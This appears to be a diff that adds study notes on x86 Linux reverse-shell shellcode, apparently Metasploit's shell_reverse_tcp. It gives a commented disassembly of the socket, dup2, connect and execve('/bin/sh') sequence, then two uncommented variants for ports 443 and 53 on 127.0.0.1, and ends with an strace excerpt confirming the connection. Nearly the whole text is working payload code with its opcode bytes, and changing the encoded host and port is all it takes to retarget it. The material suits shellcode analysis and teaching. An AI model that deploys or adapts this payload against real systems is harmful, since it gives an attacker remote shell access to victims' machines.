@@ -1,0 +1,125 @@
+
+
+
+; meta shell_reverse_tcp lhost 127.0.0.1 lport 443
+
+
+00000000  31DB              xor ebx,ebx		;zero out ebx
+00000002  F7E3              mul ebx		;zero out eax and edx
+00000004  53                push ebx		; save 0 at top of stack
+00000005  43                inc ebx		; increase ebx by one for socketcall number, in this case it will be socket()
+00000006  53                push ebx		; save 1 as top of the stack
+00000007  6A02              push byte +0x2	; push 0x2 at top of the stack, 0x2 represent AF_INET
+00000009  89E1              mov ecx,esp		; address for arguments for socket() which will be (AF_INET=2,SOCK_STREAM=1,IPPROTO_IP=0)
+0000000B  B066              mov al,0x66		; syscall for socketcall
+0000000D  CD80              int 0x80		; initiate syscall
+0000000F  93                xchg eax,ebx	; move the file descriptor created for the socket to ebx
+00000010  59                pop ecx		; move 0x2 to ecx register
+00000011  B03F              mov al,0x3f		; syscall for dup2()
+00000013  CD80              int 0x80		; initiate syscall 
+00000015  49                dec ecx		; decrease the ecx register by 1
+00000016  79F9              jns 0x11		; check if zero flag is on and jump 
+00000018  687F000001        push dword 0x100007f ; push the host ip address in hex  
+0000001D  68020001BB        push dword 0xbb010002 ; push the port and AF_INET together since both of them are 16 bit value
+00000022  89E1              mov ecx,esp		  ; address for arguments for connect() which will be (File_descripto,[AF_INET=0x02,port=0x01bb,address=0x7f000001])
+00000024  B066              mov al,0x66		  ; syscall for socketcall
+00000026  50                push eax		  ; push the value of socketLen_t
+00000027  51                push ecx		  ; push the value of SOCKETADDR struct
+00000028  53                push ebx		  ; push  the value of file descritpor  
+00000029  B303              mov bl,0x3		  ; id number for socketcall, 3 means CONNECT()
+0000002B  89E1              mov ecx,esp		  ; argument pointer for connect() will be (FILE_descriptor, [])
+0000002D  CD80              int 0x80		  ; initiate syscall 
+0000002F  52                push edx		  ; push 0 
+00000030  686E2F7368        push dword 0x68732f6e ; n/sh
+00000035  682F2F6269        push dword 0x69622f2f ;/bi
+0000003A  89E3              mov ebx,esp		  ; move address of esp which conatin "/bin/sh" to ebx
+0000003C  52                push edx		  ; push 0
+0000003D  53                push ebx		  ; push the address of "/bin/sh"
+0000003E  89E1              mov ecx,esp		  ; move the address of esp which contain an address to "/bin/sh"
+00000040  B00B              mov al,0xb		  ; syscall number for execve
+00000042  CD80              int 0x80		  ; initiate syscall 
+
+
+
+
+lhost=127.0.0.1 lport=443
+00000000  31DB              xor ebx,ebx
+00000002  F7E3              mul ebx
+00000004  53                push ebx
+00000005  43                inc ebx
+00000006  53                push ebx
+00000007  6A02              push byte +0x2
+00000009  89E1              mov ecx,esp
+0000000B  B066              mov al,0x66
+0000000D  CD80              int 0x80
+0000000F  93                xchg eax,ebx
+00000010  59                pop ecx
+00000011  B03F              mov al,0x3f
+00000013  CD80              int 0x80
+00000015  49                dec ecx
+00000016  79F9              jns 0x11
+00000018  687F000001        push dword 0x100007f
+0000001D  68020001BB        push dword 0xbb010002
+00000022  89E1              mov ecx,esp
+00000024  B066              mov al,0x66
+00000026  50                push eax
+00000027  51                push ecx
+00000028  53                push ebx
+00000029  B303              mov bl,0x3
+0000002B  89E1              mov ecx,esp
+0000002D  CD80              int 0x80
+0000002F  52                push edx
+00000030  686E2F7368        push dword 0x68732f6e
+00000035  682F2F6269        push dword 0x69622f2f
+0000003A  89E3              mov ebx,esp
+0000003C  52                push edx
+0000003D  53                push ebx
+0000003E  89E1              mov ecx,esp
+00000040  B00B              mov al,0xb
+00000042  CD80              int 0x80
+
+
+lhost=127.0.0.1 lport=53
+00000000  31DB              xor ebx,ebx
+00000002  F7E3              mul ebx
+00000004  53                push ebx
+00000005  43                inc ebx
+00000006  53                push ebx
+00000007  6A02              push byte +0x2
+00000009  89E1              mov ecx,esp
+0000000B  B066              mov al,0x66
+0000000D  CD80              int 0x80
+0000000F  93                xchg eax,ebx
+00000010  59                pop ecx
+00000011  B03F              mov al,0x3f
+00000013  CD80              int 0x80
+00000015  49                dec ecx
+00000016  79F9              jns 0x11
+00000018  687F000001        push dword 0x100007f
+0000001D  6802000035        push dword 0x35000002
+00000022  89E1              mov ecx,esp
+00000024  B066              mov al,0x66
+00000026  50                push eax
+00000027  51                push ecx
+00000028  53                push ebx
+00000029  B303              mov bl,0x3
+0000002B  89E1              mov ecx,esp
+0000002D  CD80              int 0x80
+0000002F  52                push edx
+00000030  686E2F7368        push dword 0x68732f6e
+00000035  682F2F6269        push dword 0x69622f2f
+0000003A  89E3              mov ebx,esp
+0000003C  52                push edx
+0000003D  53                push ebx
+0000003E  89E1              mov ecx,esp
+00000040  B00B              mov al,0xb
+00000042  CD80              int 0x80
+
+
+socket(AF_INET, SOCK_STREAM, IPPROTO_IP) = 3
+dup2(3, 2)                              = 2
+dup2(3, 1)                              = 1
+dup2(3, 0)                              = 0
+connect(3, {sa_family=AF_INET, sin_port=htons(53), sin_addr=inet_addr("127.0.0.1")}, 102) = 0
+
+
